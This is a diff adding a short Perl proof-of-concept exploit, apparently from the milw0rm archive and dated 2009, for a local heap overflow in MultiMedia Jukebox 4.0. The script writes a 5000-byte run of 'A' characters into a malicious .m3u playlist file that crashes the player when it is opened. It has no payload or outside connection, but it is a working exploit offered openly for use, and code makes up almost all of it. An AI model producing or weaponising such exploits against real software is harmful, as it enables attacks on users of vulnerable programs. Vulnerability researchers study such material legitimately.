@@ -1,0 +1,13 @@
+#!/usr/bin/perl
+# Found By :: HACK4LOVE
+# MultiMedia Jukebox 4.0 Build 020124 (.pst / .m3u ) Local Heap Overflow PoC
+# http://www.brothersoft.com/sorcerer-software-multimedia-jukebox-251913.html
+########################################################################################
+# special thanks for sec-code.com and sniper code
+########################################################################################
+my $crash="\x41" x 5000;
+open(myfile,'>>hack4love.m3u');
+print myfile $crash;
+########################################################################################
+
+# milw0rm.com [2009-07-16]
